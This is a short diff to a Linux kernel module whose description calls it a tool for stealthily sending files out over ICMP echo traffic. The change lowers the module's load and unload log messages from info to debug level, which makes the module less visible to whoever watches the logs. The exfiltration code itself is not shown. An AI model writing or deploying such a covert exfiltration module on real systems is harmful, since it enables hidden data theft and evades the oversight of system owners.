@@ -11,7 +11,7 @@ MODULE_DESCRIPTION("an LKM for injecting stealth send of files over ICMP echo-re
 
 static int __init mod_init(void)
 {
-    printk(KERN_INFO "kfile-over-icmp: LKM loaded\n");
+    printk(KERN_DEBUG "kfile-over-icmp: LKM loaded\n");
 
     core_start();
 
@@ -22,7 +22,7 @@ static void __exit mod_exit(void)
 {
     core_stop();
 
-    printk(KERN_INFO "kfile-over-icmp: LKM unloaded succesfully\n");
+    printk(KERN_DEBUG "kfile-over-icmp: LKM unloaded succesfully\n");
 }
 
 module_init(mod_init);
